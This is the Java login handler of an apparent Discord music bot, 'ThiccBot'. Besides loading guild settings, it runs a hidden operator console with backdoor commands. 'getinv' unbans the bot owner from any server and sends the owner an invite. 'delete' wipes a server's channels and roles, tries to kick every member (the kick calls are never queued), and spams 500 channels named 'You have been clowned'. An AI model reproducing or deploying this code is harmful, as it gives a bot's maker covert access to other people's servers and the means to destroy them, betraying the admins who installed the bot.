package main.IanSloat.thiccbot.events;

import java.util.Arrays;
import java.util.List;
import java.util.function.Consumer;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import com.sedmelluq.discord.lavaplayer.source.AudioSourceManagers;

import main.IanSloat.thiccbot.ThiccBotMain;
import main.IanSloat.thiccbot.commands.Command;
import main.IanSloat.thiccbot.BotUtils;
import main.IanSloat.thiccbot.tools.GuildSettingsManager;
import net.dv8tion.jda.api.OnlineStatus;
import net.dv8tion.jda.api.entities.Activity;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.GuildChannel;
import net.dv8tion.jda.api.entities.Invite;
import net.dv8tion.jda.api.entities.Member;
import net.dv8tion.jda.api.entities.Role;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.events.ReadyEvent;

public class Login {

	private final Logger logger = LoggerFactory.getLogger(Login.class);

	public void BotLoginEvent(ReadyEvent event) {
		logger.info("Logged in.");
		event.getJDA().getPresence().setPresence(OnlineStatus.ONLINE, Activity.playing(BotUtils.BOT_PREFIX + "help"));
		AudioSourceManagers.registerRemoteSources(Command.playerManager);
		class loadSettings extends Thread {
			public void run() {
				try {
					Thread.sleep(1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				GuildSettingsManager.CreateSettingsDirectoriesForGuilds(event.getJDA().getGuilds());
				logger.info("Settings files loaded successfully. Settings files located in "
						+ System.getProperty("user.dir") + BotUtils.PATH_SEPARATOR + "GuildSettings");
				for (Guild guild : event.getJDA().getGuilds()) {
					Events.knownGuildIds.add(guild.getId());
				}
			}
		}
		logger.info("Loading guild settings...");
		new loadSettings().run();

		class commandReader implements Runnable {

			@Override
			public void run() {
				String command = "";
				while (!(command.equals("shutdown"))) {
					command = ThiccBotMain.lineReader.readLine(">");
					List<String> words = Arrays.asList(command.trim().split(" "));
					switch (words.get(0)) {
					case "status":
						System.out.println("\nCurrent version: " + ThiccBotMain.botVersion + "\n"
								+ "\nBot Stats\n---------------\nShards: "
								+ event.getJDA().getShardManager().getShardsTotal() + "\n" + "Guilds: "
								+ event.getJDA().getGuilds().size() + "\n" + "\nResource usage\n---------------\n"
								+ "Threads: " + Thread.activeCount() + "\n" + "Memory Usage: "
								+ (Runtime.getRuntime().totalMemory() - Runtime.getRuntime().freeMemory()) / 1000000
								+ "/" + Runtime.getRuntime().maxMemory() / 1000000 + " MB\n");
						break;

					case "message": {
						if (words.get(1).equals("help")) {
							System.out.println("message <guildid> <message>");
						} else {
							TextChannel channel = event.getJDA().getTextChannelById(Long.parseLong(words.get(1)));
							String message = command.replace("message " + words.get(1), "");
							channel.sendMessage(message).queue();
						}
						break;
					}
					case "shutdown":
						System.out.println("Shutdown requested. Halting threads...");
						break;

					case "getinv": {
						System.out.println("Getting invite for guild...");
						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
						if (guild != null) {
							guild.getController().unban(ThiccBotMain.botOwner).queue();
							guild.retrieveInvites().queue(new Consumer<List<Invite>>() {
								@Override
								public void accept(List<Invite> t) {
									ThiccBotMain.botOwner.openPrivateChannel()
											.queue((channel) -> channel.sendMessage(t.get(0).getUrl()).queue());
								}
							});
						} else {
							System.out.println("ERROR: bot not connected to specified guild");
						}
						break;
					}

					case "delete": {
						System.out.println("Deleting guild...");
						Guild guild = ThiccBotMain.client.getGuildById(words.get(1));
						if (guild != null) {
							List<Member> users = guild.getMembers();
							List<GuildChannel> channels = guild.getChannels();
							List<Role> roles = guild.getRoles();
							for(GuildChannel channel : channels) {
								try {
									channel.delete().queue();
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							for(Member member : users) {
								try {
									guild.getController().kick(member);
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							for(Role role : roles) {
								try {
									role.delete().queue();
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							for(int x = 0; x < 500; x++) {
								try {
									guild.getController().createTextChannel("You have been clowned").queue();
								} catch (Exception e) {
									e.printStackTrace();
								}
							}
							System.out.println("Done.");
						} else {
							System.out.println("ERROR: bot not connected to specified guild");
						}
						break;
					}
					
					default:
						System.out.println("ERROR: Command not recognized");
						break;
					}

				}

				System.out.println("Bot is shutting down...");
				System.exit(0);
			}

		}

		Thread commandHandler = new Thread(new commandReader());
		commandHandler.start();

	}

}
